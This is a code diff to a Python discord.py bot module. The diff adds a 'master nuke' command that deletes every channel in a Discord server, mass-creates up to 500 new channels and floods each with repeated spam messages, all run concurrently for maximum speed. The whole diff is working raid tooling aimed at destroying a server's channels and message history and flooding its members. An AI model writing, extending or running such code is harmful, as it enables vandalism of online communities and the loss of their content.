@@ -1,5 +1,5 @@
 """
-NUKE COMMANDS - Mass delete & create channels
+NUKE COMMANDS - Master nuke with create, spam all in one
 All commands run at maximum speed
 """
 import discord
@@ -29,20 +29,17 @@ class Nuke(commands.Cog):
         )
 
         commands_info = {
-            "NUKE COMMANDS": [
-                ("`.nuke`", "Delete ALL channels instantly"),
-                ("`.deletechannels`", "Delete all channels (alias)"),
-                ("`.deletechannels fast`", "Delete all channels at max speed"),
+            "MASTER NUKE": [
+                ("`.nuke <count> <channel_name> <spam_count> <message>`", "DELETE ALL + CREATE + SPAM ALL"),
+                ("`.nuke`", "Delete ALL channels only"),
             ],
             "CREATE COMMANDS": [
                 ("`.createchannels <count> <name>`", "Create channels with custom name"),
                 ("`.create <count> <name>`", "Quick create alias"),
-                ("`.multicreate <count> <name>`", "Fast multi-channel creation"),
             ],
             "SPAM COMMANDS": [
                 ("`.spam <count> <#channel> <message>`", "Spam message in channel"),
                 ("`.spamall <count> <message>`", "Spam message in ALL channels"),
-                ("`.multispam <count> <message>`", "Spam all channels 10x each"),
             ],
             "UTILITY": [
                 ("`.owner`", "Get owner info"),
@@ -52,16 +49,28 @@ class Nuke(commands.Cog):
         }
 
         for category, cmds in commands_info.items():
-            cmd_list = "\n".join([f"{cmd[0]:<35} {cmd[1]}" for cmd in cmds])
+            cmd_list = "\n".join([f"{cmd[0]:<50} {cmd[1]}" for cmd in cmds])
             embed.add_field(name=category, value=f"```\n{cmd_list}\n```", inline=False)
 
-        embed.set_footer(text="⚡ Maximum Speed • No Delays")
+        embed.set_footer(text="⚡ Maximum Speed • No Delays • All at Once")
         await ctx.send(embed=embed)
 
     @commands.command(name='nuke')
     @commands.check(is_owner)
-    async def nuke_server(self, ctx):
-        """Delete ALL channels instantly (MAXIMUM SPEED)"""
+    async def nuke_server(self, ctx, channel_count: int = None, channel_name: str = None, spam_count: int = None, *, message: str = None):
+        """
+        MASTER NUKE COMMAND - Do everything at once!
+        
+        Usage 1 (Delete only):
+        .nuke
+        
+        Usage 2 (Delete + Create + Spam):
+        .nuke <channel_count> <channel_name> <spam_count> <message>
+        
+        Examples:
+        .nuke 50 spam 10 NUKED
+        .nuke 100 channel 5 SERVER NUKED
+        """
         if self.is_nuking:
             await ctx.send("⚠️ Nuke already in progress")
             return
@@ -70,9 +79,40 @@ class Nuke(commands.Cog):
             await ctx.send("❌ Bot doesn't have manage channels permission")
             return
 
+        # If no parameters, just delete channels
+        if channel_count is None:
+            await self._delete_all_channels(ctx)
+            return
+
+        # Validate parameters
+        if channel_count <= 0 or channel_count > 500:
+            await ctx.send("❌ Channel count must be between 1 and 500")
+            return
+
+        if spam_count is None or spam_count <= 0 or spam_count > 100:
+            await ctx.send("❌ Spam count must be between 1 and 100")
+            return
+
+        if not message:
+            await ctx.send("❌ Message required")
+            return
+
+        if len(message) > 2000:
+            await ctx.send("❌ Message too long (max 2000)")
+            return
+
+        # Start the master nuke
         self.is_nuking = True
-        msg = await ctx.send("⚠️ NUKING ALL CHANNELS! Confirm with ✓ (30s)")
-        await msg.add_reaction("✓")
+        
+        # Confirmation
+        confirm_msg = await ctx.send(
+            f"⚠️ **MASTER NUKE ACTIVATED**\n"
+            f"1️⃣ Delete ALL channels\n"
+            f"2️⃣ Create {channel_count} channels named '{channel_name}'\n"
+            f"3️⃣ Spam '{message}' {spam_count}x in each channel\n\n"
+            f"React ✓ to confirm (30s)"
+        )
+        await confirm_msg.add_reaction("✓")
 
         try:
             reaction, user = await self.bot.wait_for(
@@ -85,16 +125,52 @@ class Nuke(commands.Cog):
             self.is_nuking = False
             return
 
-        channels = list(ctx.guild.channels)
-        deleted_count = 0
+        # Start progress
+        progress_msg = await ctx.send("🚀 NUKE STARTED - MAXIMUM SPEED MODE\n⏳ Deleting all channels...")
+
+        # STEP 1: Delete all channels
+        deleted_count = await self._delete_all_channels_async(ctx)
+        await progress_msg.edit(content=f"🚀 NUKE IN PROGRESS\n✓ Deleted {deleted_count} channels\n⏳ Creating {channel_count} channels...")
+
+        # STEP 2: Create all channels
+        created_channels = await self._create_all_channels_async(ctx.guild, channel_count, channel_name)
+        created_count = len(created_channels)
+        await progress_msg.edit(content=f"🚀 NUKE IN PROGRESS\n✓ Deleted {deleted_count} channels\n✓ Created {created_count} channels\n⏳ Spamming messages ({spam_count}x each)...")
+
+        # STEP 3: Spam all channels
+        spammed_count = await self._spam_all_channels_async(created_channels, spam_count, message, channel_name)
         
-        # Delete all channels simultaneously (max speed)
-        tasks = []
-        for channel in channels:
-            tasks.append(self._delete_channel(channel))
+        # Final summary
+        embed = discord.Embed(
+            title="🔥 MASTER NUKE COMPLETE! 🔥",
+            description="All operations completed at maximum speed",
+            color=discord.Color.red()
+        )
+        embed.add_field(name="1️⃣ Channels Deleted", value=deleted_count, inline=False)
+        embed.add_field(name="2️⃣ Channels Created", value=created_count, inline=False)
+        embed.add_field(name="3️⃣ Messages Spammed", value=f"{spammed_count} messages ({spam_count}x in each of {created_count} channels)", inline=False)
+        embed.add_field(name="⚡ Speed", value="MAXIMUM - All at Once", inline=False)
+        embed.add_field(name="⏱️ Status", value="✅ 100% Complete", inline=False)
         
-        results = await asyncio.gather(*tasks, return_exceptions=True)
-        deleted_count = sum(1 for r in results if r is True)
+        await progress_msg.edit(content=None, embed=embed)
+        self.is_nuking = False
+
+    async def _delete_all_channels(self, ctx):
+        """Delete all channels (simple method with confirmation)"""
+        msg = await ctx.send("⚠️ DELETE ALL CHANNELS! Confirm with ✓ (30s)")
+        await msg.add_reaction("✓")
+
+        try:
+            reaction, user = await self.bot.wait_for(
+                'reaction_add',
+                check=lambda r, u: u.id == ctx.author.id and str(r.emoji) == "✓",
+                timeout=30
+            )
+        except asyncio.TimeoutError:
+            await ctx.send("❌ Cancelled")
+            return
+
+        deleted_count = await self._delete_all_channels_async(ctx)
 
         try:
             new_channel = await ctx.guild.create_text_channel("⚙️-nuked")
@@ -103,12 +179,16 @@ class Nuke(commands.Cog):
                 description=f"Deleted {deleted_count} channels",
                 color=discord.Color.red()
             )
-            embed.add_field(name="Speed", value="⚡ MAXIMUM")
             await new_channel.send(embed=embed)
         except:
             pass
 
-        self.is_nuking = False
+    async def _delete_all_channels_async(self, ctx):
+        """Delete all channels asynchronously"""
+        channels = list(ctx.guild.channels)
+        tasks = [self._delete_channel(channel) for channel in channels]
+        results = await asyncio.gather(*tasks, return_exceptions=True)
+        return sum(1 for r in results if r is True)
 
     async def _delete_channel(self, channel):
         """Helper function to delete channel"""
@@ -118,9 +198,50 @@ class Nuke(commands.Cog):
         except:
             return False
 
+    async def _create_all_channels_async(self, guild, count, name):
+        """Create all channels asynchronously and return list"""
+        tasks = []
+        for i in range(1, count + 1):
+            channel_name = f"{name}-{i}".lower()[:100]
+            tasks.append(self._create_channel_async(guild, channel_name))
+        
+        results = await asyncio.gather(*tasks, return_exceptions=True)
+        return [r for r in results if r is not None]
+
+    async def _create_channel_async(self, guild, name):
+        """Helper function to create channel and return channel object"""
+        try:
+            channel = await guild.create_text_channel(name)
+            return channel
+        except:
+            return None
+
+    async def _spam_all_channels_async(self, channels, spam_count, message, channel_name):
+        """Spam message in all channels asynchronously"""
+        tasks = []
+        total_messages = 0
+
+        for channel in channels:
+            if isinstance(channel, discord.TextChannel):
+                for i in range(spam_count):
+                    msg_content = f"{message} [{i+1}/{spam_count}]"
+                    tasks.append(self._send_message(channel, msg_content))
+                    total_messages += 1
+
+        results = await asyncio.gather(*tasks, return_exceptions=True)
+        return sum(1 for r in results if r is True)
+
+    async def _send_message(self, channel, content):
+        """Helper function to send message"""
+        try:
+            await channel.send(content)
+            return True
+        except:
+            return False
+
     @commands.command(name='deletechannels')
     @commands.check(is_owner)
-    async def delete_channels_alias(self, ctx, speed="normal"):
+    async def delete_channels_alias(self, ctx):
         """Delete all channels (Alias for nuke)"""
         await self.nuke_server(ctx)
 
@@ -143,17 +264,14 @@ class Nuke(commands.Cog):
         self.is_creating = True
         status_msg = await ctx.send(f"⚡ Creating {count} channels named '{name}'...")
 
-        created_count = 0
-        failed_count = 0
-
-        # Create all channels simultaneously (max speed)
+        # Create all channels simultaneously
         tasks = []
         for i in range(1, count + 1):
             channel_name = f"{name}-{i}".lower()[:100]
-            tasks.append(self._create_channel(ctx.guild, channel_name))
+            tasks.append(self._create_channel_async(ctx.guild, channel_name))
 
         results = await asyncio.gather(*tasks, return_exceptions=True)
-        created_count = sum(1 for r in results if r is True)
+        created_count = sum(1 for r in results if r is not None)
         failed_count = count - created_count
 
         embed = discord.Embed(
@@ -169,24 +287,10 @@ class Nuke(commands.Cog):
 
         self.is_creating = False
 
-    async def _create_channel(self, guild, name):
-        """Helper function to create channel"""
-        try:
-            await guild.create_text_channel(name)
-            return True
-        except:
-            return False
-
     @commands.command(name='create')
     @commands.check(is_owner)
     async def create_alias(self, ctx, count: int, *, name: str):
         """Quick alias for createchannels"""
-        await self.create_channels(ctx, count, name=name)
-
-    @commands.command(name='multicreate')
-    @commands.check(is_owner)
-    async def multi_create(self, ctx, count: int, *, name: str):
-        """Fast multi-channel creation"""
         await self.create_channels(ctx, count, name=name)
 
     @commands.command(name='owner')
